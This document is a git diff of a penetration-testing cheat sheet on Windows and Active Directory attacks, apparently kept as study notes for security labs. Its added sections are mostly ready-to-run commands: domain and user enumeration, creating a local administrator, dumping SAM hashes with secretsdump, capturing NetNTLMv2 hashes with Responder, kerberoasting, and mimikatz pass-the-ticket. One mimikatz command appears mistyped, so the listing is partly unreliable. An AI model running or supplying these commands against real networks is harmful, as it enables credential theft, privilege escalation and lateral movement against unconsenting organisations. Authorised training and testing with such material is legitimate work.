@@ -164,8 +164,8 @@ hash types can be found at: https://hashcat.net/wiki/doku.php?id=example_hashes
 
 useful hash modes (-m value):
 
-- NTLMv2-SSP: 5600
-- 
+- 5600: NTLMv2-SSP
+- 13100: Kerberos RC4 TGS Ticket (denoted by $krb5tgs$23$)
 
 </details>
 
@@ -495,42 +495,59 @@ find /home -name authorized_hosts -perm 2 2>dev/null
 <summary> windows </summary>
 
 ``` bat
+rem show DNS details
 ipconfig /displaydns
-rem show local user accounts
-net users
-rem list all domain users
+
+rem show all user accounts (local or domain)
+net user
+net1.exe user
 net user /domain
-rem list all domain groups
-net group /domain
-rem show membership of a specific domain group 
-net group "groupname" /domain
-rem show password policy of the domain
-net accounts /domain
-rem show information about the logged in user
-net user username
-rem show accounts with a bad password count > 0
-Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
+
+rem show information about a specific user (local or domain)
+net user [username]
+net user [username] /domain
+
+rem list all groups (local or domain)
 net localgroup
-net localgroup administrators
-rem show information about a specific domain user
-net user user_name /domain
-rem firewall settings
+net group /domain
+
+rem show membership of a specific group (local or domain)
+net localgroup "groupname"
+net group "groupname" /domain
+net group "Domain Admins" /domain
+
+rem show password policy (local or domain)
+net accounts
+net accounts /domain
+
+rem add a user
+net user [username] password /add
+
+rem add user to local admins
+net localgroup administrators [username] /add
+
+rem show accounts with a bad password login count > 0
+Get-ADObject -Filter 'badPwdCount -gt 0' -Server domain.com
+
+rem show firewall settings
 netsh firewall show state
 netsh firewall show config
+netsh advfirewall show allprofiles state
+
 rem show scheduled tasks
 schtasks /query /fo LIST /v
+
 rem show patch level 
 wmic qfe get Caption,Description,HotFixID,InstalledOn
-rem add a user
-net user logon_name password /add
-rem add user to local admins
-net localgroup administrators logon_name /add
-rem list all domain admins
-net group "Domain Admins" /domain
+
 rem find file recursively
 dir /s *name*
+
 rem find secrets recursiveley
 dir /s *pass* == *cred* == *vnc* == *.config*
+
+rem query for SPNs
+setspn.exe -T * -Q */*
 
 rem use sysinternals adexplorer to fetch active directory information
 ADExplorer.exe 
@@ -638,8 +655,36 @@ winrm set winrm/config/client/auth '@{TrustedHosts ="*"}'
 </details>
 
 <details>
-<summary> responder </summary>
+<summary> get SAM hive (local accounts) </summary>
 
+``` bat
+rem get SAM hive
+reg save HKLM\SAM C:\SAM.hive
+
+rem get the key for decrypting SAM
+reg save HKLM\SYSTEM C:\SYSTEM
+```
+``` bash
+# exfil the above files back to attcker machine, and dump the hashes
+secretsdump.py -ntds ~/sam.hive -system ~/system -outputfile hashes.txt LOCAL
+```
+</details>
+
+<details>
+<summary> pass-the-hash (NTLM) </summary>
+
+1. Obtain NT hashes from SAM or ntds.dit
+2. Use the hashes themselves (with SMB) as the password with tools like psexec 
+</details>
+
+<details>
+<summary> sniffing (NetNTLMv2 challenge/reponse) </summary>
+
+1. start a fake SMB server
+2. coerce NTLMv2 authentication (ip based) or wait for authentication (vuln scanners), or embedding a remote picture (hosted on your smb shared) in a word document
+3. challenge the client, record response 
+
+#### responder
 ``` bash
 # assuming the attacker is on the same network as the target, Responder can resolve any LLMNR requests and capture NTLMv2 hashes.
 sudo Responder.py -I eth0
@@ -648,6 +693,51 @@ sudo Responder.py -I eth0
 
 # once the hash is obtained, the hash can be cracked with hashcat
 hashcat -m 5600 /tools/responder/logs/* /usr/share/rockyou.txt
+```
+#### pcap
+``` bash
+# start listener on port 445 on attacker machine 
+sudo tcpdump -nv -w winauth.pcap port 445
+
+# extract hashes from pcap
+sudo /pcredz/pcredz -vf winauth.pcap
+
+# crack NTLMv2 challenge/response
+hashcat -m 5600 /pcredz/logs/NTLMv2.txt passwords.txt 
+```
+</details>
+
+<details>
+<summary> kerberoast </summary>
+
+``` bash
+# find user accounts (not computer accounts) who have registered SPNs (or get them from bloodhound)
+GetUserSPNs.py domain.com/username:password -request -dc-ip 10.120.2.59 > spns.txt
+
+# extract just the TGS tickets from the GetUserSPNs output
+grep krb5tgs spns.txt > tgs.txt
+
+# GetUserSPNs will provide the TGS ticket, which can be cracked with hashcat (in this case prepend password guesses with a single digit)
+hashcat -m 13100 -a 7 tgs.txt ?d rockyou.txt
+```
+</details>
+
+<details>
+<summary> pass-the-ticket (kerberos) </summary>
+
+``` bash
+# all we're doing here, is stealing a user's TGT and using it
+# on the compromised user's machine running mimikatz, list TGT ticket
+kerberos::tgt
+
+# export the TGT ticket
+kerberos::list /export
+
+# on new system, load the stolen TGT ticket
+kerberos::ppt ticket.kirbi
+
+# now, in the same cmd prompt, you can authenticate to services as the compromised user
+psexec \\dc01 cmd.exe
 ```
 </details>
 
